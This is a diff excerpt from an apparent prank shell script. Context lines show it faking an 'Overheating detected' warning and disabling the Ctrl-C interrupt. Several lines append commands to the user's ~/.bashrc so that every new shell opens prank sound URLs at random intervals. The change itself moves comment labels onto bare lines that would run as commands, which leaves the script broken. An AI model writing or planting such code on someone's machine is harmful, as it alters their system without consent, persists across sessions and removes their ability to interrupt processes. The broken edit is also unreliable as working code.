@@ -45,18 +45,22 @@ nohup bash -c "sleep 60 && echo 'Overheating detected'" >/dev/null 2>&1 &
 #delete
 ###
 (sleep 20; stty intr undef) &
-###sounds
+###
+sounds
 ###
 ###Wilhelm scream	
 ###
 echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/wilhelm.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
-###Fart	
+###
+Fart	
 ###
 echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/fart.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
-###aleert
+###
+aleert
 ####
 echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/hacker.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
-###laugh
+###
+laugh
 ###
 echo "(sleep \$((RANDOM % 60 + 30)); xdg-open 'https://www.myinstants.com/media/sounds/spongebob-laugh.mp3') >/dev/null 2>&1 &" >> ~/.bashrc
 
